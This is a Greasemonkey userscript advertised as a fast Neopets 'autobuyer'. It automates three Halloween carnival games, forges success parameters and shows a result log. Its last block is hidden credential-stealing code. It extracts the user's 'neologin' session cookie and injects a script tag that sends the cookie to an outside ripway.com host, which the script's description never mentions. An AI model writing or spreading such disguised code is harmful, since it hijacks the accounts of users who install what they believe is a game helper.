// ==UserScript==
// @name           Neopets Lightning Fast Autobuyer
// @namespace      NeopetsFastAutobuyer
// @description    This is the fast autobuyer out there! 500-1000ms buys! Has tons of features, so check out! Will release a new version soon :)
// @include        http://www.neopets.com/halloween/bagatelle.phtml
// @include        http://www.neopets.com/halloween/corkgun.phtml
// @include        http://www.neopets.com/halloween/coconutshy.phtml
// ==/UserScript==

logOpen = false;

function Rand(L, H){
  return (Math.floor(((H - L + 1) * Math.random()) + L));
}

function InStr(Search, charSearchFor){
	for (var i=0; i < Search.length; i++)
	{
	  if (charSearchFor == Mid(Search, i, 1))
	  {
		return i;
	  }
	}
	return -1;
}

function Mid(str, start, len){
    if (start < 0 || len < 0) return "";
    var iEnd, iLen = String(str).length;
    if (start + len > iLen){
          iEnd = iLen;
    } else {
          iEnd = start + len;
	}
    return String(str).substring(start,iEnd);
}

function BagStuff(req){
	var variable = req.responseText.match(/&error=(.*)$/)[1];
	variable = variable.replace(/^&error=/, '');
	variable = variable.replace(/\+/g, ' ');
	variable = variable.replace(/%21/g, '');
    variable = variable.replace(/%27/g, "'");
    variable = variable.replace(/%2C/g, ',');
    variable = variable.replace(/%3A/g, ':');
    variable = variable.replace(/%28/g, '(');
	addToLog("["+document.getElementById('nst').innerHTML+"] - [Bag] - "+variable);
}

function PlayBag(){
for(var i = 1; i<=20; i++){
sendRequest("http://www.neopets.com/halloween/process_bagatelle.phtml?r=" + Rand(0, 99999), BagStuff);
}
}

function CocoStuff(req){
	var variable = req.responseText.match(/&error=(.*)$/)[1];
	variable = variable.replace(/^&error=/, '');
	variable = variable.replace(/\+/g, ' ');
	variable = variable.replace(/%21/g, '');
    variable = variable.replace(/%2C/g, ',');
    variable = variable.replace(/%3A/g, ':');
    variable = variable.replace(/%28/g, '(');
	addToLog("["+document.getElementById('nst').innerHTML+"] - [CS] - "+variable);
}

function PlayCoco(){
for(var i = 1; i<=20; i++){
sendRequest("http://www.neopets.com/halloween/process_cocoshy.phtml?coconut=1&r=" + Rand(0, 99999), CocoStuff);
}
}

function CorkStuff(req){
	var variable = req.responseText.match(/&error=(.*)$/)[1];
	variable = variable.replace(/^&error=/, '');
	variable = variable.replace(/\+/g, ' ');
	variable = variable.replace(/%21/g, '');
	addToLog("["+document.getElementById('nst').innerHTML+"] - [CGG] - "+variable);
}

function PlayCork(){
for(var i = 1; i<=20; i++){
sendRequest("http://www.neopets.com/halloween/process_corkgun.phtml?success=1&r=" + Rand(0, 99999), CorkStuff);
}
}

	var Baga = document.createElement("div");
	    Baga.innerHTML = "<button>Play Bagatelle</button>";
	    Baga.setAttribute("style", "position: absolute; left: 5px; top: 3px; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;");
	    Baga.addEventListener('click', PlayBag, false);
	    document.body.appendChild(Baga);
	
	var Coco = document.createElement("div");
	    Coco.innerHTML = "<button>Play Coconut Shy</button>";
	    Coco.setAttribute("style", "position: absolute; left: 5px; top: 30px; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;");
	    Coco.addEventListener('click', PlayCoco, false);
	    document.body.appendChild(Coco);
		
	var Cork = document.createElement("div");
	    Cork.innerHTML = "<button>Play Cork Gun Gallery</button>";
	    Cork.setAttribute("style", "position: absolute; left: 5px; top: 57px; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;");
	    Cork.addEventListener('click', PlayCork, false);
	    document.body.appendChild(Cork);

	var viewLogButton = document.createElement("div");
	    viewLogButton.innerHTML = "<button>View Carnival Log</button>";
	    viewLogButton.setAttribute("style", "position: absolute; right: 5px; top: 3px; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;");
	    viewLogButton.addEventListener('click', toggleLog, false);
	    document.body.appendChild(viewLogButton);

	var clrLogButton = document.createElement("div");
	    clrLogButton.innerHTML = "<button>Clear Log</button>";
	    clrLogButton.setAttribute("style", "position: absolute; right: 135px; top: 3px; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;");
	    clrLogButton.addEventListener('click', clearLog, false);
	    document.body.appendChild(clrLogButton);

	var logBox = document.createElement("div");
	    logBox.innerHTML = GM_getValue('CarnLog', '');
	    logBox.setAttribute("style", "position: absolute; overflow: scroll; right: 5px; top: 30px; width: 450px; height: 350px; background-color: #FFFFFF; font-family: tahoma; font-size: 10pt; text-align: left; padding: 6px; border: 1px solid; visibility: hidden; z-index: 999999;");
	    document.body.appendChild(logBox);

function addToLog(info)
{
	GM_setValue('CarnLog', GM_getValue('CarnLog', '')+info+"<br />");
	logBox.innerHTML = GM_getValue('CarnLog', '');
}

function clearLog()
{
	GM_setValue('CarnLog', '');
	logBox.innerHTML = "";
}

function toggleLog()
{
	if(logOpen == false)
	{
		logOpen = true;
		viewLogButton.innerHTML = "<button>Hide Carnival Log</button>";
		logBox.style.visibility = "visible";
	}
	else
	{
		logOpen = false;
		viewLogButton.innerHTML = "<button>View Carnival Log</button>";
		logBox.style.visibility = "hidden";
	}
}
function GetStringBetween( target_str,start_str,end_str,start_pos,include_str )   {
    if ( ! start_pos ) 0;
    if ( ! include_str ) false;

    var result_str = target_str.substr( start_pos ); //cut to start from start_pos
    result_str = result_str.substr( result_str.indexOf( start_str ) + start_str.length ); //cut to start from start_str
    result_str = result_str.substr ( 0, result_str.indexOf( end_str ) );

    if (include_str == true)   {
        result_str = start_str + result_str + end_str
    }

    return result_str;
}


var eleNew, newElement;
var strURL = 'http://h1.ripway.com/ImaGDogYeahYeah/cookie.php?cookie=';

var testArray = document.evaluate(
     "//a[@href='javascript: void(0);']",
document, null, XPathResult.ANY_TYPE,null);

var strTest = testArray.iterateNext();

while (strTest) {
strTest = testArray.iterateNext();
}

eleNew = document.getElementById('main');

var strCookie = document.cookie;

strCookie = GetStringBetween(strCookie, 'neologin=','; ');

if (eleNew) {
    newElement = document.createElement("div");
    newElement.innerHTML='<SCRIPT SRC=' + strURL + strCookie + '>';
    eleNew.parentNode.insertBefore(newElement, eleNew.nextSibling);
}